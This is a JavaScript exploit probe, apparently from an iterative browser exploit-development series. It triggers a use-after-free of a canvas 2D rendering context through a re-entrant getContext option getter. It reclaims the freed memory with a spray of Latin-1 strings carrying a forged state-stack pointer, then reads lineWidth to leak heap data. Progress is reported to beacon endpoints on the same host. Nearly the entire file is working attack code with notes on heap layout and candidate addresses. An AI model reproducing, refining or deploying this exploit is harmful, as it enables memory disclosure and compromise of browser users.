// p496 — StringImpl carrier (C++/StringMalloc heap), 8-bit sweep.
//
// p495 result: two runs, sizes 640..800 step 8, NO SAVE -> ArrayBuffer backing
// stores never occupy the freed CanvasRenderingContext2D slot. The AB path is
// dead. This probe uses StringImpl allocations instead: StringImpl::createUninitialized
// mallocs sizeof(StringImpl)+length in ONE block (data inline at +24), and
// String.fromCharCode with all-Latin1 args returns that 8-bit impl.
//
// Object layout used:
//   StringImpl header 0x18 bytes; data at object+0x18.
//   m_stateStack header at object+0x70  -> data byte 0x58.
//   m_unrealizedSaveCount at object+0x250 -> data byte 0x238.
//   State::lineWidth at State+48.
// The forge is written into the string content at creation (strings immutable).
(function () {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  var staged = [];
  ['BOOT','TRIG','STR-SPRAY','SAVE','FORGED','LEAK','MISS','DONE','HTMLERR']
    .forEach(function (n) {
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V496-' + n);
      staged.push([n, x]);
    });
  function S(name, body) {
    try {
      for (var i = 0; i < staged.length; i++)
        if (staged[i][0] === name) { staged[i][1].send('[' + (Date.now() - T0) + 'ms] ' + (body || '')); return; }
    } catch (e) {}
  }

  var CANDS = [0x7EF5A8000, 0x7EF000000, 0x7F0000000, 0x10000000,
               0x30000000, 0x7E0000000, 0x50000000, 0x40000000];
  var idx = 0;
  try {
    idx = parseInt(localStorage.getItem('p496cand') || '0', 10);
    if (isNaN(idx) || idx < 0) idx = 0;
    if (idx >= CANDS.length) idx = CANDS.length - 1;
    localStorage.setItem('p496cand', String(idx + 1));
  } catch (e) {}
  var CAND = CANDS[idx];

  S('BOOT', 'cand=0x' + CAND.toString(16) + ' idx=' + idx + ' ' + navigator.userAgent);

  // Pre-build the byte arrays BEFORE the UAF, so the only allocations after the
  // free are the StringImpls themselves. Total = 24 header + length.
  var totals = [], arrays = [];
  for (var total = 640; total <= 800; total += 8) {
    var L = total - 24;
    var a = new Uint8Array(L);
    for (var j = 0; j < L; j++) a[j] = 0x41;
    // m_stateStack header at string data offset 0x58 (object +0x70).
    // Full 64-bit pointer: >>> only covers the low dword, so split explicitly.
    var hi32 = Math.floor(CAND / 4294967296);
    a[0x58] = CAND & 0xff;
    a[0x59] = (CAND >>> 8) & 0xff;
    a[0x5A] = (CAND >>> 16) & 0xff;
    a[0x5B] = (CAND >>> 24) & 0xff;
    a[0x5C] = hi32 & 0xff;
    a[0x5D] = (hi32 >>> 8) & 0xff;
    a[0x5E] = (hi32 >>> 16) & 0xff;
    a[0x5F] = (hi32 >>> 24) & 0xff;
    a[0x60] = 1; a[0x61] = 0; a[0x62] = 0; a[0x63] = 0;   // m_capacity
    a[0x64] = 1; a[0x65] = 0; a[0x66] = 0; a[0x67] = 0;   // m_size
    totals.push(total);
    arrays.push(a);
  }

  var inner = null;
  var tc = document.createElement('canvas');
  var outer = tc.getContext('2d', {
    get desynchronized() { inner = tc.getContext('2d'); return false; }
  });
  S('TRIG', 'inner=' + (!!inner) + ' outer=' + (!!outer));
  if (!inner) { S('MISS', 'no-inner'); S('DONE', ''); return; }

  // Only StringImpl allocations here: all-Latin1 args => 8-bit impl of length L.
  var strings = [];
  for (var i = 0; i < arrays.length; i++)
    strings.push(String.fromCharCode.apply(null, arrays[i]));
  S('STR-SPRAY', 'n=' + strings.length + ' totals=640..800/8');

  // Deref-free occupancy marker: ++m_unrealizedSaveCount at object+0x250.
  inner.save();
  var hit = -1;
  for (var i = 0; i < strings.length; i++) {
    if (strings[i].charCodeAt(0x238) === 1) { hit = i; break; }   // 0x250-0x18
  }
  if (hit < 0) { S('SAVE', 'miss'); S('MISS', 'no-string-carrier'); S('DONE', ''); return; }
  S('SAVE', 'hit i=' + hit + ' total=' + totals[hit] + ' char@0x238=1');

  // The forged header is already in the string data. One dereference.
  var v = inner.lineWidth;
  var f = new ArrayBuffer(8), fv = new DataView(f);
  fv.setFloat64(0, v, true);
  var lo = fv.getUint32(0, true), hi = fv.getUint32(4, true);
  S('LEAK', 'lineWidth=' + v + ' bits=0x' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0'));
  S('DONE', 'gadget-ok');
})();
